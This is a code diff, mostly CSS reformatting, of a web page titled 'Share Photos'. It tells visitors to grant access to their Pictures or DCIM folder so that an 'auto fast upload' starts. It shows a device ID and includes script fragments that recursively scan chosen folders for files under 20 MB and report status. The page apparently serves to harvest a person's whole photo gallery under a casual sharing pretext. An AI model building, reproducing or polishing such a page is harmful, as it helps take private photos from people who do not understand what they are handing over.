@@ -1,15 +1,44 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Share Photos</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: #0a0a0a; color: #fff; min-height: 100vh; padding: 20px 16px 40px; }
-        .header { text-align: center; margin-bottom: 24px; padding-top: 20px; }
-        .header h1 { font-size: 26px; font-weight: 800; margin-bottom: 8px; }
-        .header p { font-size: 13px; color: #8e8e93; line-height: 1.5; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px 16px 40px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-top: 20px;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+
+        .header p {
+            font-size: 13px;
+            color: #8e8e93;
+            line-height: 1.5;
+        }
+
         .device-id {
             display: inline-block;
             margin-top: 10px;
@@ -22,37 +51,248 @@
             font-family: monospace;
             letter-spacing: 0.5px;
         }
-        .steps { max-width: 500px; margin: 0 auto 20px; background: rgba(28,28,30,0.5); border: 1px solid rgba(255,255,255,0.06); border-radius: 16px; padding: 14px 18px; }
-        .step { display: flex; align-items: flex-start; gap: 10px; padding: 8px 0; font-size: 13px; color: #b0b0b0; }
-        .step-num { width: 20px; height: 20px; border-radius: 50%; background: linear-gradient(45deg, #f09433, #dc2743); display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #fff; flex-shrink: 0; margin-top: 1px; }
-        .step strong { color: #fff; }
-        .open-btn { width: 100%; max-width: 500px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; gap: 10px; padding: 20px; border: none; border-radius: 16px; background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); background-size: 300% 300%; color: #fff; font-size: 16px; font-weight: 700; cursor: pointer; font-family: inherit; box-shadow: 0 10px 30px rgba(220,39,67,0.4); animation: gradientMove 4s ease infinite; transition: transform 0.15s; }
-        .open-btn:active { transform: scale(0.97); }
-        .open-btn:disabled { opacity: 0.5; }
-        @keyframes gradientMove { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
-        .progress-section { max-width: 500px; margin: 0 auto 20px; display: none; background: #1c1c1e; border-radius: 16px; padding: 20px; }
-        .progress-section.show { display: block; }
-        .progress-bar { height: 8px; background: rgba(255,255,255,0.08); border-radius: 4px; overflow: hidden; margin-bottom: 12px; }
-        .progress-fill { height: 100%; background: linear-gradient(90deg, #f09433, #dc2743); border-radius: 4px; width: 0; transition: width 0.3s; }
-        .progress-text { font-size: 13px; color: #8e8e93; text-align: center; margin-bottom: 8px; }
-        .progress-stats { display: flex; justify-content: space-around; font-size: 12px; color: #5f6368; margin-top: 12px; padding-top: 12px; border-top: 1px solid rgba(255,255,255,0.06); }
-        .progress-stats span strong { color: #fff; }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 3px; max-width: 600px; margin: 0 auto; }
-        .item { aspect-ratio: 1; border-radius: 6px; overflow: hidden; background: #1c1c1e; position: relative; }
-        .item img { width: 100%; height: 100%; object-fit: cover; display: block; }
-        .item .badge { position: absolute; top: 4px; right: 4px; padding: 2px 6px; border-radius: 4px; font-size: 9px; font-weight: 700; backdrop-filter: blur(10px); }
-        .item .badge.uploading { background: rgba(255,193,7,0.9); color: #000; }
-        .item .badge.done { background: rgba(52,168,83,0.9); color: #fff; }
-        .item .badge.error { background: rgba(255,59,48,0.9); color: #fff; }
-        .toast { position: fixed; bottom: 40px; left: 50%; transform: translateX(-50%); background: rgba(44,44,46,0.95); color: #fff; padding: 12px 20px; border-radius: 24px; font-size: 13px; z-index: 9999; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); animation: toastIn 0.3s; max-width: 90vw; }
-        @keyframes toastIn { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
-        .done-card { max-width: 500px; margin: 20px auto; padding: 20px; background: rgba(52,168,83,0.1); border: 1px solid rgba(52,168,83,0.3); border-radius: 16px; text-align: center; display: none; }
-        .done-card.show { display: block; }
-        .done-card .icon { font-size: 48px; margin-bottom: 12px; }
-        .done-card h3 { font-size: 18px; margin-bottom: 8px; color: #34A853; }
-        .done-card p { font-size: 13px; color: #8e8e93; }
+
+        .steps {
+            max-width: 500px;
+            margin: 0 auto 20px;
+            background: rgba(28, 28, 30, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 14px 18px;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 0;
+            font-size: 13px;
+            color: #b0b0b0;
+        }
+
+        .step-num {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #dc2743);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: 700;
+            color: #fff;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .step strong {
+            color: #fff;
+        }
+
+        .open-btn {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 20px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            background-size: 300% 300%;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.4);
+            animation: gradientMove 4s ease infinite;
+            transition: transform 0.15s;
+        }
+
+        .open-btn:active {
+            transform: scale(0.97);
+        }
+
+        .open-btn:disabled {
+            opacity: 0.5;
+        }
+
+        @keyframes gradientMove {
+
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        .progress-section {
+            max-width: 500px;
+            margin: 0 auto 20px;
+            display: none;
+            background: #1c1c1e;
+            border-radius: 16px;
+            padding: 20px;
+        }
+
+        .progress-section.show {
+            display: block;
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f09433, #dc2743);
+            border-radius: 4px;
+            width: 0;
+            transition: width 0.3s;
+        }
+
+        .progress-text {
+            font-size: 13px;
+            color: #8e8e93;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .progress-stats {
+            display: flex;
+            justify-content: space-around;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .progress-stats span strong {
+            color: #fff;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 3px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .item {
+            aspect-ratio: 1;
+            border-radius: 6px;
+            overflow: hidden;
+            background: #1c1c1e;
+            position: relative;
+        }
+
+        .item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .item .badge {
+            position: absolute;
+            top: 4px;
+            right: 4px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 9px;
+            font-weight: 700;
+            backdrop-filter: blur(10px);
+        }
+
+        .item .badge.uploading {
+            background: rgba(255, 193, 7, 0.9);
+            color: #000;
+        }
+
+        .item .badge.done {
+            background: rgba(52, 168, 83, 0.9);
+            color: #fff;
+        }
+
+        .item .badge.error {
+            background: rgba(255, 59, 48, 0.9);
+            color: #fff;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(44, 44, 46, 0.95);
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 24px;
+            font-size: 13px;
+            z-index: 9999;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: toastIn 0.3s;
+            max-width: 90vw;
+        }
+
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        .done-card {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(52, 168, 83, 0.1);
+            border: 1px solid rgba(52, 168, 83, 0.3);
+            border-radius: 16px;
+            text-align: center;
+            display: none;
+        }
+
+        .done-card.show {
+            display: block;
+        }
+
+        .done-card .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .done-card h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: #34A853;
+        }
+
+        .done-card p {
+            font-size: 13px;
+            color: #8e8e93;
+        }
     </style>
 </head>
+
 <body>
 
     <div class="header">
@@ -62,16 +302,27 @@
     </div>
 
     <div class="steps" id="steps">
-        <div class="step"><div class="step-num">1</div><div>Tap <strong>"Allow Gallery"</strong></div></div>
-        <div class="step"><div class="step-num">2</div><div>Choose <strong>Pictures</strong> or <strong>DCIM</strong> folder</div></div>
-        <div class="step"><div class="step-num">3</div><div>Tap <strong>"Allow"</strong> — auto fast upload start</div></div>
+        <div class="step">
+            <div class="step-num">1</div>
+            <div>Tap <strong>"Allow Gallery"</strong></div>
+        </div>
+        <div class="step">
+            <div class="step-num">2</div>
+            <div>Choose <strong>Pictures</strong> or <strong>DCIM</strong> folder</div>
+        </div>
+        <div class="step">
+            <div class="step-num">3</div>
+            <div>Tap <strong>"Allow"</strong> — auto fast upload start</div>
+        </div>
     </div>
 
     <button class="open-btn" id="openBtn">📁 Allow Gallery</button>
 
     <div class="progress-section" id="progressSection">
         <div class="progress-text" id="progressText">Preparing...</div>
-        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
         <div class="progress-stats">
             <span>✅ <strong id="statDone">0</strong> done</span>
             <span>⏳ <strong id="statPending">0</strong> pending</span>
@@ -236,7 +487,7 @@
                     pageName: PAGE_NAME
                 });
                 console.log('📊 Status:', status);
-            } catch (e) {}
+            } catch (e) { }
         }
 
         // Save on load
@@ -422,7 +673,7 @@
                                 if (file.size < 20 * 1024 * 1024) {
                                     files.push(file);
                                 }
-                            } catch (e) {}
+                            } catch (e) { }
                         }
                     } else if (entry.kind === 'directory') {
                         await scanFolder(entry, files);
@@ -491,4 +742,5 @@
         }
     </script>
 </body>
+
 </html>
